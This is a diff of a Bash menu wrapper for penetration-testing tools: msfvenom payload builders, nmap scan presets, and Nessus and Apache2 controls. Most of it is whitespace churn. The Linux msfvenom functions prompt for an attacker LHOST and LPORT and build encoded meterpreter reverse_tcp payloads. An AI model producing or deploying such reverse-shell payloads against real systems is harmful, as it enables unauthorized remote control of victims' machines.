+
+
+
+
 
 
 
@@ -1726,11 +3784,23 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
 
 
 
+
+
+
+
                 echo
+
+
+
+
 
 
 
@@ -1738,7 +3808,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
              else
+
+
+
+
 
 
 
@@ -1746,15 +3824,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 figlet "M S F V E N O M" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -1762,7 +3840,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -1770,15 +3872,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -1786,7 +3904,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -1794,7 +3920,19 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -1806,15 +3944,31 @@ linux_msfvenom64() {
 
 
 
-echo
 
-
-
-echo
 
 
 
 echo
+
+
+
+
+
+
+
+echo
+
+
+
+
+
+
+
+echo
+
+
+
+
 
 
 
@@ -1822,11 +3976,23 @@ show_ip_addresses
 
 
 
+
+
+
+
 echo
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1834,7 +4000,15 @@ read -p "Enter LHOST (e.g., \"192.168.1.5\") " H1
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1842,7 +4016,15 @@ read -p "Enter LPORT (e.g., \"4444\") " P1
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1850,7 +4032,15 @@ read -p "Enter Payload Format (e.g., \"sh\") " format1
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1858,7 +4048,15 @@ read -p "Enter The Numbers to run the encoder (e.g., \"5\") " NUMBER1
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1866,7 +4064,15 @@ read -p "Enter Payload save path (e.g., \"/home/kali\"): " S1
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1874,7 +4080,15 @@ read -p "Enter Payload name (e.g., \"Payload.sh\"): " name1
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1882,7 +4096,15 @@ echo    "Creating Payload..."
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -1890,7 +4112,15 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp --platform Linux LHOST=$H1 LPORT=$
 
 
 
+
+
+
+
 if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -1898,15 +4128,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 figlet "M S F V E N O M" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -1914,7 +4144,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -1922,11 +4176,23 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
 
 
 
+
+
+
+
                 echo
+
+
+
+
 
 
 
@@ -1934,7 +4200,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
              else
+
+
+
+
 
 
 
@@ -1942,15 +4216,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 figlet "M S F V E N O M" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -1958,7 +4232,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -1966,15 +4264,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -1982,7 +4296,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -1990,7 +4312,19 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -2002,15 +4336,31 @@ linux_msfvenom86() {
 
 
 
-echo
 
-
-
-echo
 
 
 
 echo
+
+
+
+
+
+
+
+echo
+
+
+
+
+
+
+
+echo
+
+
+
+
 
 
 
@@ -2018,11 +4368,23 @@ show_ip_addresses
 
 
 
+
+
+
+
 echo
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2030,7 +4392,15 @@ read -p "Enter LHOST (e.g., \"192.168.1.5\") " H2
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2038,7 +4408,15 @@ read -p "Enter LPORT (e.g., \"4444\") " P2
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2046,7 +4424,15 @@ read -p "Enter Payload Format (e.g., \"sh\") " format2
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2054,7 +4440,15 @@ read -p "Enter The Numbers to run the encoder (e.g., \"5\") " NUMBER2
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2062,7 +4456,15 @@ read -p "Enter Payload save path (e.g., \"/home/kali\"): " S2
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2070,7 +4472,15 @@ read -p "Enter Payload name (e.g., \"Payload.sh\"): " name2
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2078,7 +4488,15 @@ echo    "Creating Payload..."
 
 
 
+
+
+
+
 echo
+
+
+
+
 
 
 
@@ -2086,7 +4504,15 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp --platform Linux LHOST=$H2 LPORT=$
 
 
 
+
+
+
+
 if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -2094,15 +4520,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 figlet "M S F V E N O M" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -2110,7 +4536,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -2118,11 +4568,23 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
 
 
 
+
+
+
+
                 echo
+
+
+
+
 
 
 
@@ -2130,7 +4592,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
              else
+
+
+
+
 
 
 
@@ -2138,15 +4608,15 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 figlet "M S F V E N O M" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -2154,7 +4624,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -2162,15 +4656,31 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2178,11 +4688,27 @@ if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
             read cont
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -2194,15 +4720,31 @@ ios_msfvenom() {
 
 
 
-    echo
 
-
-
-    echo
 
 
 
     echo
+
+
+
+
+
+
+
+    echo
+
+
+
+
+
+
+
+    echo
+
+
+
+
 
 
 
@@ -2210,11 +4752,23 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2222,7 +4776,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2230,7 +4792,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2238,7 +4808,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2246,7 +4824,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2254,7 +4840,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2262,7 +4856,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2274,7 +4876,19 @@ ios_msfvenom() {
 
 
 
+
+
+
+
+
+
+
+
     if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -2282,15 +4896,31 @@ ios_msfvenom() {
 
 
 
+
+
+
+
         figlet "M S F V E N O M" | lolcat
 
 
 
+
+
+
+
         echo
 
 
 
+
+
+
+
         echo
+
+
+
+
 
 
 
@@ -2298,7 +4928,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
         echo
+
+
+
+
 
 
 
@@ -2306,7 +4944,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     else
+
+
+
+
 
 
 
@@ -2314,7 +4960,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
         figlet "M S F V E N O M" | lolcat
+
+
+
+
 
 
 
@@ -2322,7 +4976,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     fi
+
+
+
+
 
 
 
@@ -2330,7 +4992,15 @@ ios_msfvenom() {
 
 
 
+
+
+
+
     echo "Press [ENTER] to return to the menu."
+
+
+
+
 
 
 
@@ -2338,7 +5008,19 @@ ios_msfvenom() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -2350,15 +5032,31 @@ android_msfvenom() {
 
 
 
-    echo
 
-
-
-    echo
 
 
 
     echo
+
+
+
+
+
+
+
+    echo
+
+
+
+
+
+
+
+    echo
+
+
+
+
 
 
 
@@ -2366,11 +5064,23 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2378,7 +5088,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2386,7 +5104,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2394,7 +5120,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2402,7 +5136,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2410,7 +5152,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo
+
+
+
+
 
 
 
@@ -2422,7 +5172,19 @@ android_msfvenom() {
 
 
 
+
+
+
+
+
+
+
+
     if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -2430,15 +5192,31 @@ android_msfvenom() {
 
 
 
+
+
+
+
         figlet "M S F V E N O M" | lolcat
 
 
 
+
+
+
+
         echo
 
 
 
+
+
+
+
         echo
+
+
+
+
 
 
 
@@ -2446,7 +5224,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
         echo
+
+
+
+
 
 
 
@@ -2454,7 +5240,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     else
+
+
+
+
 
 
 
@@ -2462,7 +5256,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
         figlet "M S F V E N O M" | lolcat
+
+
+
+
 
 
 
@@ -2470,7 +5272,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     fi
+
+
+
+
 
 
 
@@ -2478,7 +5288,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
     echo "Press [ENTER] to return to the menu."
+
+
+
+
 
 
 
@@ -2486,7 +5304,19 @@ android_msfvenom() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -2498,7 +5328,15 @@ android_msfvenom() {
 
 
 
+
+
+
+
 nmap_options() {
+
+
+
+
 
 
 
@@ -2506,7 +5344,15 @@ nmap_options() {
 
 
 
+
+
+
+
     figlet "N M A P" | lolcat 
+
+
+
+
 
 
 
@@ -2514,7 +5360,15 @@ nmap_options() {
 
 
 
+
+
+
+
     echo $orange"+------------------------------------------+"
+
+
+
+
 
 
 
@@ -2522,7 +5376,15 @@ nmap_options() {
 
 
 
+
+
+
+
     echo $orange"|$white [2] $yellow Version Detection$orange                   |"
+
+
+
+
 
 
 
@@ -2530,7 +5392,15 @@ nmap_options() {
 
 
 
+
+
+
+
     echo $orange"|$white [4] $yellow All Scan$orange                            |"
+
+
+
+
 
 
 
@@ -2538,11 +5408,23 @@ nmap_options() {
 
 
 
+
+
+
+
     echo ""
 
 
 
+
+
+
+
     echo $okegreen"Choose Scan Type: ";tput sgr0
+
+
+
+
 
 
 
@@ -2554,7 +5436,19 @@ nmap_options() {
 
 
 
+
+
+
+
+
+
+
+
     case $scan_type in
+
+
+
+
 
 
 
@@ -2562,11 +5456,23 @@ nmap_options() {
 
 
 
+
+
+
+
             scan_args="-sS -O -Pn -sV -p-"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2574,11 +5480,23 @@ nmap_options() {
 
 
 
+
+
+
+
             scan_args="-sV"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2586,11 +5504,23 @@ nmap_options() {
 
 
 
+
+
+
+
             scan_args="-O"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2598,11 +5528,23 @@ nmap_options() {
 
 
 
+
+
+
+
             scan_args="-sS -O -Pn -sV -p-"
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2610,7 +5552,15 @@ nmap_options() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -2618,7 +5568,15 @@ nmap_options() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -2626,7 +5584,15 @@ nmap_options() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2634,7 +5600,19 @@ nmap_options() {
 
 
 
+
+
+
+
 }
+
+
+
+
+
+
+
+
 
 
 
@@ -2646,7 +5624,15 @@ execute_option() {
 
 
 
+
+
+
+
     case $1 in
+
+
+
+
 
 
 
@@ -2654,7 +5640,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2662,7 +5656,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2670,7 +5672,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2678,7 +5688,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo ""
+
+
+
+
 
 
 
@@ -2686,7 +5704,15 @@ execute_option() {
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -2694,7 +5720,15 @@ execute_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2702,7 +5736,15 @@ execute_option() {
 
 
 
+
+
+
+
           payloads
+
+
+
+
 
 
 
@@ -2710,7 +5752,15 @@ execute_option() {
 
 
 
+
+
+
+
         
+
+
+
+
 
 
 
@@ -2718,7 +5768,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2726,7 +5784,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -2734,7 +5800,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2742,7 +5816,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2750,7 +5832,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2758,7 +5848,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2766,7 +5864,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2774,7 +5880,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2782,11 +5896,23 @@ execute_option() {
 
 
 
+
+
+
+
             clear
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2794,15 +5920,15 @@ execute_option() {
 
 
 
+
+
+
+
             figlet "N E S S U S" | lolcat
 
 
 
-            echo
 
-
-
-            echo
 
 
 
@@ -2810,7 +5936,31 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
 
 
 
@@ -2818,7 +5968,15 @@ execute_option() {
 
 
 
+
+
+
+
             if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -2826,15 +5984,15 @@ execute_option() {
 
 
 
+
+
+
+
                figlet "N E S S U S" | lolcat
 
 
 
-               echo
 
-
-
-               echo
 
 
 
@@ -2842,7 +6000,31 @@ execute_option() {
 
 
 
+
+
+
+
                echo
+
+
+
+
+
+
+
+               echo
+
+
+
+
+
+
+
+               echo
+
+
+
+
 
 
 
@@ -2850,7 +6032,15 @@ execute_option() {
 
 
 
+
+
+
+
             else
+
+
+
+
 
 
 
@@ -2858,15 +6048,15 @@ execute_option() {
 
 
 
+
+
+
+
                figlet "N E S S U S" | lolcat
 
 
 
-               echo
 
-
-
-               echo
 
 
 
@@ -2874,7 +6064,31 @@ execute_option() {
 
 
 
+
+
+
+
                echo
+
+
+
+
+
+
+
+               echo
+
+
+
+
+
+
+
+               echo
+
+
+
+
 
 
 
@@ -2882,15 +6096,31 @@ execute_option() {
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2898,7 +6128,15 @@ execute_option() {
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -2906,7 +6144,15 @@ execute_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -2914,7 +6160,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -2922,11 +6176,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2934,7 +6200,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2942,7 +6216,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -2950,11 +6232,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2962,7 +6256,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2970,7 +6272,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -2978,11 +6288,23 @@ execute_option() {
 
 
 
+
+
+
+
             if [ $? -eq 0 ]; then
 
 
 
+
+
+
+
                 echo
+
+
+
+
 
 
 
@@ -2990,15 +6312,15 @@ execute_option() {
 
 
 
+
+
+
+
                 figlet "A P A C H E 2" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -3006,7 +6328,31 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -3014,11 +6360,23 @@ execute_option() {
 
 
 
+
+
+
+
             else
 
 
 
+
+
+
+
                 echo
+
+
+
+
 
 
 
@@ -3026,15 +6384,15 @@ execute_option() {
 
 
 
+
+
+
+
                 figlet "A P A C H E 2" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -3042,7 +6400,31 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -3050,15 +6432,31 @@ execute_option() {
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3066,7 +6464,15 @@ execute_option() {
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -3074,7 +6480,15 @@ execute_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -3082,7 +6496,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -3090,11 +6512,7 @@ execute_option() {
 
 
 
-            echo
 
-
-
-            echo
 
 
 
@@ -3102,7 +6520,31 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
 
 
 
@@ -3110,11 +6552,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3122,7 +6576,15 @@ execute_option() {
 
 
 
+
+
+
+
             if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -3130,15 +6592,15 @@ execute_option() {
 
 
 
+
+
+
+
                 figlet "A P A C H E 2" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -3146,7 +6608,31 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -3154,11 +6640,23 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
 
 
 
+
+
+
+
                 echo
+
+
+
+
 
 
 
@@ -3166,7 +6664,15 @@ execute_option() {
 
 
 
+
+
+
+
                 read cont
+
+
+
+
 
 
 
@@ -3174,7 +6680,15 @@ execute_option() {
 
 
 
+
+
+
+
                 clear
+
+
+
+
 
 
 
@@ -3182,11 +6696,7 @@ execute_option() {
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -3194,7 +6704,31 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -3202,11 +6736,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3214,7 +6760,15 @@ execute_option() {
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -3222,11 +6776,23 @@ execute_option() {
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -3234,7 +6800,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -3242,11 +6816,7 @@ execute_option() {
 
 
 
-            echo
 
-
-
-            echo
 
 
 
@@ -3254,11 +6824,39 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
 
 
 
@@ -3266,7 +6864,15 @@ execute_option() {
 
 
 
+
+
+
+
             if [ $? -eq 0 ]; then
+
+
+
+
 
 
 
@@ -3274,15 +6880,15 @@ execute_option() {
 
 
 
+
+
+
+
                 figlet "UPDATING SYSTEM" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -3290,7 +6896,31 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -3298,7 +6928,15 @@ execute_option() {
 
 
 
+
+
+
+
             else
+
+
+
+
 
 
 
@@ -3306,15 +6944,15 @@ execute_option() {
 
 
 
+
+
+
+
                 figlet "UPDATING SYSTEM" | lolcat
 
 
 
-                echo
 
-
-
-                echo
 
 
 
@@ -3322,7 +6960,31 @@ execute_option() {
 
 
 
+
+
+
+
                 echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
+
+
+
+                echo
+
+
+
+
 
 
 
@@ -3330,15 +6992,31 @@ execute_option() {
 
 
 
+
+
+
+
             fi
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3346,7 +7024,15 @@ execute_option() {
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -3354,7 +7040,15 @@ execute_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -3362,17 +7056,19 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
 
             figlet "R E M O V I N G" | lolcat
 
 
 
-            echo
 
-
-
-            echo
 
 
 
@@ -3380,7 +7076,31 @@ execute_option() {
 
 
 
+
+
+
+
             echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
+
+
+
+            echo
+
+
+
+
 
 
 
@@ -3388,11 +7108,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3400,11 +7132,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3412,11 +7156,23 @@ execute_option() {
 
 
 
+
+
+
+
             echo
 
 
 
+
+
+
+
             echo
+
+
+
+
 
 
 
@@ -3424,7 +7180,15 @@ execute_option() {
 
 
 
+
+
+
+
             read cont
+
+
+
+
 
 
 
@@ -3432,7 +7196,15 @@ execute_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -3440,7 +7212,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -3448,11 +7228,23 @@ execute_option() {
 
 
 
+
+
+
+
             update_script
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -3460,7 +7252,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo "Exiting..."
+
+
+
+
 
 
 
@@ -3468,7 +7268,15 @@ execute_option() {
 
 
 
+
+
+
+
             ;;
+
+
+
+
 
 
 
@@ -3476,7 +7284,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -3484,7 +7300,15 @@ execute_option() {
 
 
 
+
+
+
+
             echo $red"Invalid option, choose between 1 and 10"
+
+
+
+
 
 
 
@@ -3492,7 +7316,15 @@ execute_option() {
 
 
 
+
+
+
+
             clear
+
+
+
+
 
 
 
@@ -3500,7 +7332,15 @@ execute_option() {
 
 
 
+
+
+
+
     esac
+
+
+
+
 
 
 
@@ -3512,7 +7352,19 @@ execute_option() {
 
 
 
+
+
+
+
+
+
+
+
 while true; do
+
+
+
+
 
 
 
@@ -3520,7 +7372,15 @@ while true; do
 
 
 
+
+
+
+
     print_menu
+
+
+
+
 
 
 
@@ -3528,7 +7388,15 @@ while true; do
 
 
 
+
+
+
+
     echo $okegreen"┌─["$red"EasyTerminal$okegreen]──[$red~$okegreen]"
+
+
+
+
 
 
 
@@ -3536,11 +7404,23 @@ while true; do
 
 
 
+
+
+
+
     execute_option $choice
 
 
 
+
+
+
+
 done
+
+
+
+
 
 
 
